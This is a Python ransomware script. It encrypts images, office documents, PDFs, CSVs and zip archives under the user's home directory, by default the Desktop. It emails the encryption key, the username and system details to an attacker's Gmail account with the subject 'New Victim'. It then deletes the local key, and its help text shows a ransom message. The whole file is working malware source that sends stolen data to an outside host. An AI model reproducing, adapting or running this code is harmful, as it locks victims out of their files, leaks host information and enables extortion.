import argparse
import getpass
import os
import pathlib
import smtplib
import platform
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv

######################## ARGUMENTS ########################

parser = argparse.ArgumentParser(description=f'Your files have been encrypted. Contact us ({os.environ.get("gmail_account")}) for further details and to get the decryption key.')
parser.add_argument('-k', '--key', type=str, metavar='', help='add cryptographic key to decrypt the document')
parser.add_argument('-b', '--backup', help='add cryptographic key to decrypt the document', action='store_true')
parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='Desktop')
args = parser.parse_args()

######################## FUNCTIONS ########################

def navigate_to_target_directory(directory_name):
    folder_location = pathlib.Path.home() / directory_name
    os.chdir(folder_location)
    return folder_location

def get_files_in_dir(current_directory):
    targeted_file_types = [ '.png', '.jpg', 'jpeg','.doc', '.docx', '.xls', '.xlsx', '.pdf', '.csv', '.zip' ]
    file_list = []
    for root, subdirectories, files in os.walk(current_directory):
        for file in files:
            for file_type in targeted_file_types:
                if file_type in file:
                    file_list.append(os.path.join(root, file))    
        for subdirectory in subdirectories:    
            get_files_in_dir(subdirectory) 
    return file_list

def send_email():
    load_dotenv() 
    email_address = os.environ.get("gmail_account")
    password = os.environ.get("gmail_password")
    msg = MIMEMultipart()
    msg['Subject'] = f'New Victim - { getpass.getuser() }'
    msg['From'] = email_address
    msg['to'] = email_address
    crypto_key = f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key'
    msg_body = ( 
        f'Username: {getpass.getuser()} \n'
        f'\n'
        f'System: {platform.uname().system} \n'
        f'None: {platform.uname().node} \n'
        f'Release: {platform.uname().release} \n'
        f'Version: {platform.uname().version} \n'
        f'Machine: {platform.uname().machine} \n'
        f'Processor: {platform.uname().processor} \n'
        f'\n'
        f'Cryptographic Key: { open(crypto_key).read() } \n'
        )
    msg.attach(MIMEText(msg_body,'plain'))
    try:
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.ehlo()
        smtp_server.login(email_address, password)
        smtp_server.sendmail(email_address, email_address, msg.as_string())
        smtp_server.close()
    except Exception as error_msg:
        print ("Error:",error_msg)

def generate_key():
    key = Fernet.generate_key()
    with open('cryptographic_key.key', 'wb') as key_file:
        key_file.write(key)
    send_email()
   
def encrypt_files(file_list):
    with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
        cryptographic_key = key_file.read()
    fernet = Fernet(cryptographic_key)
    if file_list:
        for document in file_list:
            with open(document, 'rb') as file:
                document_original = file.read()
            document_criptat = fernet.encrypt(document_original)
            with open(document, 'wb') as encrypted_document:
                encrypted_document.write(document_criptat)
        if args.backup == False:        
            os.remove(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key')
        
    else:
        print('No document in directory')

def decrypt_files(file_list, cryptographic_key):
    # with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
    #     cryptographic_key = key_file.read()
    fernet = Fernet(cryptographic_key)
    for document in file_list:
        with open(document, 'rb') as file:
            document_criptat = file.read()
        document_decriptat = fernet.decrypt(document_criptat)
        with open(document, 'wb') as encrypted_document:
            encrypted_document.write(document_decriptat)

######################## RUNING THE RANSOMWARE ########################

if args.key:
    directory = navigate_to_target_directory(args.directory)
    documents = get_files_in_dir(directory)
    decrypt_files(documents, args.key)
else:
    generate_key()
    directory = navigate_to_target_directory(args.directory)
    documents = get_files_in_dir(directory)
    encrypt_files(documents)